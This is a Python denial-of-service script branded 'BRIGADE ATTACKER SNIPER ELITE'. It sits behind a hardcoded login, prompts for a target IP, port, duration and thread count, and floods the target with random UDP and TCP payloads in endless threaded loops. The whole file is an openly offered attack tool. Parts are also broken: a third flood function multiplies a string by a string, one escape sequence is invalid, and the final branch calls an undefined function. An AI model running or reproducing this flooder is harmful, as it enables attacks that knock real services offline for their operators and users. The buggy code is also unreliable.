# -*- coding: utf-8 -*-
import logging
import random
import socket
import threading
import os
import sys
import time
import fade
os.system("clear")

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[97m'
    BOLD    = "\033[1m"
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"

attemps = 0
os.system("clear")
logo = """
    ▓▒▓▒▓▒▓▒░     ▓▒▓▒░      ▓▒▓▒▓▒▓▒░   ▓▒▓▒▓▒▓▒░    ▓▒▓▒▓▒░       
    ▓▒░     ▓▒░  ▓▒░  ▓▒░   ▓▒░          ▓▒░         ▓▒░  ▓▒░      
    ▓▒░     ▓▒░ ▓▒░    ▓▒░  ▓▒░          ▓▒░             ▓▒░  
    ▓▒▓▒▓▒▓▒░   ▓▒░    ▓▒░   ▓▒░▓▒░▓▒░   ▓▒░            ▓▒░  
    ▓▒░     ▓▒░ ▓▒░    ▓▒░          ▓▒░  ▓▒▓▒▓▒▓▒░     ▓▒░  
    ▓▒░     ▓▒░ ▓▒░▓▒▓▒▓▒░          ▓▒░  ▓▒░          ▓▒░  
    ▓▒▓▒▓▒▓▒░   ▓▒░    ▓▒░   ▓▒▓▒▓▒▓▒░   ▓▒▓▒▓▒▓▒░    ▓▒▓▒▓▒▓▒░    
    ▒░▒░▒░▒░     ▒░     ▒░     ▒░▒░▒▒░     ▒░▒░▒░▒░    ▒░▒░▒▒░    
       ░▒ ░       ░      ░       ▒░ ░         ░ ▒░         ▒░▒░  
        ▒░          ░   ░          ░            ░            ░  
╔══════════════════════════════════════════════════════════════╗
 \033[33m                 BRIGADE ATTACKER SNIPER ELITE
 \033[94m              FREEDOM IS THE RIGHT OF ALL NATIONS
╚══════════════════════════════════════════════════════════════╝
"""
faded_text = fade.fire(logo)
print(faded_text)
while attemps < 100:
    username = input("\033[33mEnter your username: \033[0m")
    password = input("\033[32mEnter your password: \033[0m")

    if username == '6453' and password == '6453':
        print('Selamat datang di zona BASE!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

ip = str(input("\033[37m Target IP : \033[0m"))
port = int(input("\033[36m Target Port : \033[0m"))
choice = str(input("\033[35m (y/n) : \033[0m"))
times = int(input("\033[34m Time : \033[0m"))
threads = int(input("\033[33m Threads : \033[0m"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[+]","[*]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[33mBASE2  \033[31mHTTP flood  \033[36m" +str(ip)+ "::.. \033[0m")
		except:
			print(i +" \033[32mBASE2  \033[34mHTTP flood  \033[36m" +str(ip)+ "::. \033[0m")
def run2():
	data = random._urandom(999)
	i = random.choice(("[+]","[*]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[93mBASE2  \033[94mHTTP flood  \033[97m" +str(ip)+ "::... \033[0m")
		except:
			s.close()
			print(i +" \033[4mBASE2  \033[93mHTTP flood  \033[35m" +str(ip)+ "::. \033[0m")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[+]","[*]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i *" \036[4mBASE2  \033[37mHTTP flood  \033[35m" +str(ip)+ "::.... \033[0m")
		except:
			s.close()
			print(i *" \036[33mBASE2  \033[37mHTTP flood  \033[4m" +str(ip)+ "::. \033[0m")
							
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		
else:
		th = threading.Thread(target = run4)
		th.start()
